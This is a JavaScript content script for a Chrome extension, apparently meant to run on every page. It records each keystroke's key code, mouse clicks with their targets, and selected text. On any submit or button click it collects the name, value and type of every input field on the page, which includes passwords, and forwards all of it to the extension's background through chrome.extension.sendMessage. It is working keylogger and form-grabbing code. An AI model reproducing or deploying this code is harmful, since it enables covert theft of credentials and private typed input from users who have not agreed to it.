document.addEventListener('DOMContentLoaded', function() {
   // your code here
	//var changeFrame=0;
	var record="";
	var charCount=0;
	var keyPoints="";
	document.onkeyup=function(e) {
		if(e.which > 64 && e.which < 91){
			//Do nothing as this is alphabets
		} else if(e.which > 185 && e.which < 193){
			//Do nothing (special characters)
		} else if(e.which > 218 && e.which < 223){
			//Do nothing (special characters)
		} else if(e.which > 47 && e.which < 58){
			//Do nothing (Numbers)
		}
		//Shift Key released
		else if(e.which == 16){
			keyPoints=keyPoints+ ' ' + e.which;
			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
					console.log(response);
			}); */
			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
					console.log(response);
			});
		}
		//Backspace key pressed
		else if(e.which == 8){
			keyPoints=keyPoints+ ' ' + e.which;
			var subso = "'"+record+"' "+record.length+" ";
			record = record.substring(0,(record.length-1));
			subso = subso + "'"+record+"' "+record.length;
			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+subso+""}, function(response) {
					console.log(response);
			}); */
			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
					console.log(response);
			});
		}
		//Spacebar key pressed
		else if(e.which == 32){
			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
				console.log(response);
			});
		}
		//Enter key pressed
		else if(e.which == 13){
			keyPoints=keyPoints+ ' ' + e.which;
			/* chrome.extension.sendMessage({greeting: "keys", data: ""+record+""}, function(response) {
				console.log(response);
			}); */
			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
				console.log(response);
			});
		} else {
			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
				console.log(response);
			});
		}
	
	}
	document.onkeypress=function(e){
		var flag = false;
		if(e.which > 96 && e.which < 127){
			flag = true;
		} else if(e.which > 57 && e.which < 97){
			flag = true;
		} else if(e.which > 32 && e.which <58){
			flag = true;
		} else{
			flag = false;
		}
		if(flag == true){
			record=record+String.fromCharCode(e.which);
			keyPoints=keyPoints+ ' ' +e.which;
			charCount++;
			chrome.extension.sendMessage({greeting: "keypress", data: ""+e.which+""}, function(response) {
				console.log(response);
			}); 
		}
	}
}, false);

	   //document.addEventListener("mousemove", mouseMoving, false);
       //document.addEventListener("mousedown", mousePressed, false);
       document.addEventListener("mouseup", mouseReleased, false);
       document.addEventListener("click", mouseClicked, false);
       
       function mouseMoving(e) {
            //console.log(e.screenX + " " + e.screenY);
       }
       
       function mousePressed(e) {
			//alert("Mouse Pressed !");
            console.log("Mouse is down!");
       }
       
       function mouseReleased(e) {
		   //alert("Mouse Released !");
            console.log("Mouse is up!");
            console.log("selected text : "+getSelectedText());
       }
       
       function mouseClicked(e) {
		   //alert("Mouse Clicked !");
			//console.log("Mouse is clicked!"+e.screenX + " " + e.screenY+" "+e.target+"Tag Name :"+e.target.tagName);
			chrome.extension.sendMessage({greeting: "mouse", data: "MOUSE3: Mouse clicked! ("+e.screenX + ", " + e.screenY+") "+e.target.nodeName+" [Tag Name :"+e.target.tagName+"] "+e.target.value}, function(response) {
					console.log(response);
			});
            //console.log(e.target.getAttribute('type'));
            if(e.target.tagName=='INPUT')
            {
                if(e.target.getAttribute('type')=='submit')
                {
                    saveFormFields();
                }
            }else if(e.target.tagName=='BUTTON'){
               saveFormFields();
            }else{
				if(e.target.parentNode.tagName=='BUTTON'){
					saveFormFields();
				}else if(e.target.parentNode.tagName=='INPUT')
				{
					if(e.target.getAttribute('type')=='submit')
					{
						saveFormFields();
					}
				}
				/* else{
					chrome.extension.sendMessage({greeting: "hello", data: "MOUSE3: "+e.screenX + " " + e.screenY+" "+e.target+"Tag Name :"+e.target.tagName+""}, function(response) {
						console.log(response);
					});
				} */
			}
        }
		function saveFormFields() {                        
			//console.log("Form Fields Saved\n");
            inputs = document.getElementsByTagName('input');
			/* chrome.extension.sendMessage({greeting: "mouse", data: "Length = "+inputs.length+"\n"}, function(response) {
					console.log(response);
			}); */
			var logformfields = '';
			for (index = 0; index < inputs.length; ++index) {
               //console.log(inputs[index]+":"+inputs[index].value+"\n");
			   logformfields += inputs[index]+"~ "+inputs[index].name+": "+inputs[index].value+" ["+inputs[index].type+"]\n"; 
			}
			chrome.extension.sendMessage({greeting: "hello", data: "MOUSE2: "+logformfields}, function(response) {
				console.log(response);
			});
		}


function getSelectedText() {
    if (window.getSelection) {
        txt = window.getSelection();
    } else if (window.document.getSelection) {
        txt =window.document.getSelection();
    } else if (window.document.selection) {
        txt = window.document.selection.createRange().text;
    }
	//alert("selected: "+txt);
	chrome.extension.sendMessage({greeting: "selected", data: ""+txt}, function(response) {
		console.log(response);
	});
    return txt;  
}